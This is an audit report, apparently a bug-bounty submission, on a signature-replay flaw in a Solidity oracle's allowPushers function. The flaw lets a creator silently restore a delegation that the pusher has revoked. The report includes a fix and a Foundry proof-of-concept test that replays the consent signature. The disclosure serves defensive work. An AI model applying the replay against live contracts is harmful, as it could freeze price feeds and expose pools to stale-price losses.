### Title
Pusher consent signature can be replayed within the deadline window to silently re-establish a revoked delegation — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers()` verifies a pusher's EIP-191 consent signature but never marks it as consumed. Any creator who holds a previously accepted consent signature can replay it — within the deadline window — to re-establish a delegation that the pusher already revoked via `revokePusher()`. The pusher's subsequent fallback pushes are silently redirected into the creator's namespace, making the pusher's own feeds stale and exposing pools that consume those feeds to stale-price execution.

---

### Finding Description

`allowPushers` constructs a signature digest over `(chainid, address(this), deadline, pusher, msg.sender)` and recovers the signer:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));

namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The only replay guard is the deadline check in `_ensureDeadline`:

```solidity
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
``` [2](#0-1) 

There is **no used-signature bitmap, nonce, or any other one-time-use guard** — confirmed by the complete absence of any `usedSignature`, `nonce`, or `_nonces` storage in the production contracts. The deadline only prevents replay *after* it expires; within the window the same `(deadline, pusher, creator)` tuple is accepted an unlimited number of times.

The revocation path clears the mapping:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

But because the original consent signature is still valid (deadline not yet expired), the creator can immediately call `allowPushers` again with the same `(deadline, [pusher], [sig])` arguments, writing `namespaceRemapping[pusher] = creator` back into storage. The pusher has no on-chain way to detect this without monitoring events.

The fallback push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So every push the pusher makes after the silent re-delegation lands in the creator's namespace, not the pusher's own. The pusher's own feeds (`feedIdOf(pusher, slotIndex, positionIndex)`) stop receiving updates and their stored `timestampMs` freezes.

The code comment itself acknowledges the concern but incorrectly treats the deadline as a complete fix:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [5](#0-4) 

The deadline prevents replay *after* expiry, not *within* the window.

---

### Impact Explanation

Pools that consume feeds from the pusher's own namespace (via `feedIdOf(pusher, slotIndex, positionIndex)`) receive a frozen `timestampMs`. Every provider that wraps this oracle applies a `maxTimeDrift` staleness check; once the timestamp is old enough, the provider returns a stale or zero price. A swap that reaches `getBidAndAskPrice` with a stale feed either reverts (broken core pool functionality) or, if the staleness check is misconfigured, executes against a stale bid/ask quote — matching the allowed impact of **bad-price execution: stale bid/ask quote reaches a pool swap** and **broken core pool functionality causing loss of funds or unusable swap flows**.

---

### Likelihood Explanation

The trigger is **unprivileged from the creator's perspective**: the creator already holds the consent signature from the original `allowPushers` call. No new off-chain material is needed. The only precondition is that the deadline has not yet expired, which is a normal operational window (e.g., 1 day). The pusher has no on-chain mechanism to invalidate the old signature short of waiting for the deadline to expire.

---

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) private _usedConsents` keyed on the signature hash (or the digest itself). After a successful `allowPushers` call, mark the digest as used and `require(!_usedConsents[hash])` before writing the remapping. This is the exact fix applied to the analogous Gateway vulnerability (Analog Labs remediation commit `8460f408`).

Alternatively, include a per-pusher nonce in the signed message so that each consent is single-use by construction.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayDelegationTest is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function test_replayConsentAfterRevoke() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent for creator
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // 4. Creator replays the SAME signature — deadline still valid
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // succeeds — no revert

        // 5. Delegation is silently re-established without pusher's fresh consent
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation re-established via replay");

        // 6. Pusher's subsequent pushes go to creator's namespace, not their own
        uint56 tsMs = uint56(block.timestamp * 1000);
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(
            abi.encodePacked(uint256(tsMs) << 8 | uint256(0)) // slotId=0
        );
        // pusher's own feedId is now stale — pools consuming it get stale prices
    }
}
```
